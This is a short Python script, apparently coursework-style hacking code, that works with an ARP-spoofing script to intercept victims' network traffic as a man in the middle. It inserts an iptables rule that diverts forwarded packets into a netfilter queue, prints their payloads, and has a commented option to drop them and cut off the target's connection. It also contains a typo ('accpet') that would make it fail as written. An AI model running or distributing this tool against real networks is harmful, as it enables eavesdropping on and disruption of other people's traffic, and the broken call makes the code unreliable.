"""
A program that acts as MITM (Man In The Middle) to intercept packet.

Algorithm:
    1. Create a queue in hacker machine
    2. Trap packets inside the queue (request -> queue) so they won't be sent to 
       target machines directly
    3. Access and modify the queue 
    4. Send the modified packets as request to target machine
    5. Same way for response

Use iptables: program that allows us to modify route on the computer 
               (routing rule)
              linux command: iptables -I FORWARD -j NFQUEUE --queue-num 0

Caution: Running with arp_spoof.py at the same time. 

Required: netfilterqueue
          pip install netfilterqueue
"""
import netfilterqueue
import subprocess


def process_packet(packet):
    print(packet.get_payload())
    # forward the packet to destination
    packet.accpet()

    # cut the internet connection of the target client
    # i.e. not allowing the packet to reach destination
    # packet.drop()


def use_iptables():
    num_queue = 0
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE",
                     "--queue-num", str(num_queue)])
    return num_queue


if __name__ == "__main__":
    queue_number = use_iptables()
    queue = netfilterqueue.NetfilterQueue()

    # connect or bind the queue to the queue that we created using iptables by
    # giving queue number
    queue.bind(queue_number, process_packet)
    queue.run()
